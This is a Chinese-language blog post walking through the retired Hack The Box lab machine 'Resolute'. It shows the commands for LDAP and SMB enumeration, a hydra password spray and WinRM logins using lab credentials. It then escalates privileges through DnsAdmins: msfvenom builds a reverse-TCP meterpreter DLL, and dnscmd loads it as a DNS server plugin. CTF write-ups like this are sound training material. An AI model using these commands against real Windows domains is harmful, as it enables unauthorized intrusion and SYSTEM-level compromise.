> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5H9qlG0jKJm6bjCwfgTKxg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **180** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/220

靶机难度：中级（4.7/10）

靶机发布日期：2020 年 5 月 28 日

靶机描述：

Resolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group. This group has the ability to specify that the DNS Server service loads a plugin DLL. After restarting the DNS service, we achieve command execution on the domain controller in the context of NT_AUTHORITY\SYSTEM .

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)

  

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/65kKfpfiaHYJb5Dich6GdMtnZre8jhjTibGVwwOgApImzZWplXUib7CrRLG0ZlcicwWM9spLF5qwfdicWeLtwabw5VWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGovyDdIpnYHE1NZujV5lUR17cJ3licgqEkicnLV4S7WQcP8wzjCiaia3uCw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.169...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGiczdlMMs4UOwV0LDW7BpfpJLpS7MBy68fHveuk4muYcHjnoxo99zsow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGG3Xn9NhrpVE0D0ic5Amf11q7Tcab26p9JuIQ0LZ2ZvibDuGvThnYm4lA/640?wx_fmt=png)

```
sudo nmap -sC -sV -A -p- 10.10.10.169 -o 10.10.10.169
```

可看到 nmap 开了很多端口，ldap，smb，http 等... 可以开始枚举了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGmPQ43jtcfG00f6J7huIic05cDZlsarlSCnKHiar1abR8zXywY1EHhA3Q/640?wx_fmt=png)

```
enum4linux -a 10.10.10.169
```

ldap 进行枚举，这里用很多次了 enum4linux，发现了密码... 现在需要继续等待枚举 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGmQW0lxtAZGpZic4p4icJZQJibINbwVIBMUCicNsVbricS6cs9vEIPqatB2Q/640?wx_fmt=png)

可看到，枚举到了很多用户名... 爆破下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGeFsCRKjVRxAXldt40HKcWmicDXQbnOQFia3BQpXvPCC7VIrVVKgnQGCw/640?wx_fmt=png)

利用 hydra 进行了爆破，获得了正确的用户名密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGxqIk1LpCPW9bD9CsqxnRQOblFZygm6ricibaUj2vDodib56hcO7TZZUibw/640?wx_fmt=png)

```
evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
```

获得了 smb 用户名密码，这里利用了 evil-winrm 登录进入... 限制挺大

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGQytDYoH36wgML2cmX9eUN0wkJfibuhHbLUs5qjlKPVeic9SPvUPvfXew/640?wx_fmt=png)

这里利用 - force 查找隐藏的目录情况...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGoVVPVbrMO5sYUiblwPDfX0XFSotFLSknAeVdRI1tlOrSaRDYTL0rzhg/640?wx_fmt=png)

继续利用 force 获得 PSTranscripts 底层隐藏信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGL8qibBP7hI3KQx9Q7cvNyTVmSVqjAaZdFjnCsDXmoDUpzLGPRicfNialg/640?wx_fmt=png)

内容中包含了 ryan 用户密码信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGYpFib2zxjvGFxzqugnbz0iboibIsb5gztA7N947kwjOeVrKdibqbBcCHibA/640?wx_fmt=png)

```
evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
```

继续利用 winrm 登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGxlWNtDwSRPXNQRBQlXVVAXWvX91Hoyr9QGnwaCicLSC6wvXKcK9KsWA/640?wx_fmt=png)

发现用户 ryan 是 DnsAdmins 的成员，成为 DnsAdmins 的成员组允许使用 dnscmd.exe，可以访问网络 DNS 信息，默认权限允许：读取和写入，创建所有子对象，删除子对象，特殊权限等，然后指定 smb 加载的插件 DLL 执行即可提权 ...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPeFzrib4q4YaA81LpknuIfGqsNybvyzpjJQWnFfr9NAtj8iaFnEg1ExsmpJXPf0YubHd7YS8zEv4FQ/640?wx_fmt=png)

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f dll > dayu.dll
impacket-smbserver dayu .
dnscmd.exe /config /serverlevelplugindll \\10.10.14.2\dayu\dayu.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

很简单的思路，将服务器级别的插件设置为 dayu.dll 共享，停止和启动 DNS 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)

获得了 root_flag 信息...

不会的 google 搜索 DnsAdmins 组 shell exploit 吧.. 很多文章都讲解了...

linux 快打完了，回归 windows 退休的几台...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)